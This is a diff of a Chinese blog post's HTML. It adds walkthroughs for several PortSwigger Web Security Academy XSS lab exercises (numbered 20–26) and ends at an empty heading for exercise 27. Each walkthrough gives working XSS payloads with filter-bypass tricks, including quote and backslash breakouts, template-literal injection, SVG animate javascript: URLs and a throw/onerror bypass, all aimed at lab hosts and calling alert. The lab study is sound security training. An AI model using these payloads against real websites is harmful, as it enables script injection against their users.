@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102104890.jpg">
 <meta property="article:published_time" content="2022-11-10T07:28:02.000Z">
-<meta property="article:modified_time" content="2023-03-12T15:20:51.408Z">
+<meta property="article:modified_time" content="2023-03-14T09:03:36.418Z">
 <meta property="article:author" content="QY">
 <meta property="article:tag" content="burpsuite靶场">
 <meta property="article:tag" content="xss">
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.6k 字
+          6.9k 字
         
       </span>
     
@@ -234,7 +234,7 @@
         
         
         
-          47 分钟
+          58 分钟
         
       </span>
     
@@ -520,7 +520,62 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?search=&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">animatetransform</span> <span class="hljs-attr">onbegin</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>输入即可完成</p>
+<h3 id="20-规范链接标记中的反射-XSS"><a href="#20-规范链接标记中的反射-XSS" class="headerlink" title="20.规范链接标记中的反射 XSS"></a>20.规范链接标记中的反射 XSS</h3><p>只能在谷歌浏览器使用</p>
+<p>payload</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://YOUR-LAB-ID.web-security-academy.net/?%<span class="hljs-number">27</span>accesskey=%<span class="hljs-number">27</span>x%<span class="hljs-number">27</span>onclick=%<span class="hljs-number">27</span>alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
 
+<h3 id="21-将XSS反射到带有单引号和反斜杠转义的JavaScript字符串中"><a href="#21-将XSS反射到带有单引号和反斜杠转义的JavaScript字符串中" class="headerlink" title="21.将XSS反射到带有单引号和反斜杠转义的JavaScript字符串中"></a>21.将XSS反射到带有单引号和反斜杠转义的JavaScript字符串中</h3><p>在搜索框输入111并且抓包</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141536819.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>发现明显漏洞点</p>
+<p>构造payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141538213.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>成功</p>
+<h3 id="22-将XSS反射到带有尖括号和双引号的JavaScript字符串中，HTML编码和单引号转义"><a href="#22-将XSS反射到带有尖括号和双引号的JavaScript字符串中，HTML编码和单引号转义" class="headerlink" title="22.将XSS反射到带有尖括号和双引号的JavaScript字符串中，HTML编码和单引号转义"></a>22.将XSS反射到带有尖括号和双引号的JavaScript字符串中，HTML编码和单引号转义</h3><p>搜索框是和上一题一样的漏洞点</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141550234.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>但是使用上一条的payload发现有过滤 尖括号被转义</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141551232.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>payload</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">\&#x27;-alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure>
+
+<p>payload思路</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141554236.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>因为可控内容在标签script标签里 因此直接不考虑尖括号过滤构造闭合即可</p>
+<h3 id="23-将-XSS-存储到带有尖括号和双引号的事件中-HTML-编码，单引号和反斜杠转义"><a href="#23-将-XSS-存储到带有尖括号和双引号的事件中-HTML-编码，单引号和反斜杠转义" class="headerlink" title="23.将 XSS 存储到带有尖括号和双引号的事件中 HTML 编码，单引号和反斜杠转义"></a>23.将 XSS 存储到带有尖括号和双引号的事件中 HTML 编码，单引号和反斜杠转义</h3><p>在博客评论区进行评论</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141608695.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>发现了漏洞点</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141609943.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://foo?<span class="hljs-symbol">&amp;apos;</span>-alert(1)-<span class="hljs-symbol">&amp;apos;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141614524.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<h3 id="24-将-XSS-反射到带有尖括号、单引号、双引号、反斜杠和反引号的模板文本中-Unicode-转义"><a href="#24-将-XSS-反射到带有尖括号、单引号、双引号、反斜杠和反引号的模板文本中-Unicode-转义" class="headerlink" title="24.将 XSS 反射到带有尖括号、单引号、双引号、反斜杠和反引号的模板文本中 Unicode 转义"></a>24.将 XSS 反射到带有尖括号、单引号、双引号、反斜杠和反引号的模板文本中 Unicode 转义</h3><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141622321.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141624407.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>发现payload被转义</p>
+<p>使用新payload</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141626026.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<h3 id="25-阻止事件处理程序和属性的反射式-XSS"><a href="#25-阻止事件处理程序和属性的反射式-XSS" class="headerlink" title="25.阻止事件处理程序和属性的反射式 XSS"></a>25.阻止事件处理程序和属性的反射式 XSS</h3><p>payload</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://YOUR-LAB-ID.web-security-academy.net/?search=%<span class="hljs-number">3</span>Csvg%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>Ca%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>Canimate+attributeName%<span class="hljs-number">3</span>Dhref+values%<span class="hljs-number">3</span>Djavascript%<span class="hljs-number">3</span>Aalert(<span class="hljs-number">1</span>)+%<span class="hljs-number">2</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>Ctext+x%<span class="hljs-number">3</span>D20+y%<span class="hljs-number">3</span>D20%<span class="hljs-number">3</span>EClick%<span class="hljs-number">20</span>me%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Ftext%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Fa%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">https://YOUR-LAB-ID.web-security-academy.net/?search=<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">animate</span> <span class="hljs-attr">attributeName</span>=<span class="hljs-string">href</span> <span class="hljs-attr">values</span>=<span class="hljs-string">javascript:alert(1)</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">20</span> <span class="hljs-attr">y</span>=<span class="hljs-string">20</span>&gt;</span>Click me<span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>这里复制payload的后半部分进行搜索不会触发弹窗</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141637796.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>直接访问带payload的url才能触发</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141638797.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload  style="zoom:50%;" />
+
+<h3 id="26-在-JavaScript-URL-中反射-XSS，但阻止了一些字符"><a href="#26-在-JavaScript-URL-中反射-XSS，但阻止了一些字符" class="headerlink" title="26.在 JavaScript URL 中反射 XSS，但阻止了一些字符"></a>26.在 JavaScript URL 中反射 XSS，但阻止了一些字符</h3><p>发现漏洞点</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141647036.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>payload</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//YOUR-LAB-ID.web-security-academy.net/post?postId<span class="hljs-operator">=</span><span class="hljs-number">5</span>&amp;<span class="hljs-variable">%27</span>&#125;<span class="hljs-punctuation">,</span><span class="hljs-keyword">x</span><span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-operator">=</span><span class="hljs-variable">%3</span>E&#123;throw/**/onerror<span class="hljs-operator">=</span>alert<span class="hljs-punctuation">,</span><span class="hljs-number">1337</span>&#125;<span class="hljs-punctuation">,</span>toString<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-punctuation">,</span>window<span class="hljs-variable">%2</span>b<span class="hljs-variable">%27</span><span class="hljs-variable">%27</span><span class="hljs-punctuation">,</span>&#123;<span class="hljs-keyword">x</span>:<span class="hljs-variable">%27</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141650251.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<h3 id="27-反射式XSS与AngularJS沙盒转义没有字符串"><a href="#27-反射式XSS与AngularJS沙盒转义没有字符串" class="headerlink" title="27.反射式XSS与AngularJS沙盒转义没有字符串"></a>27.反射式XSS与AngularJS沙盒转义没有字符串</h3>
                 
               </div>
             
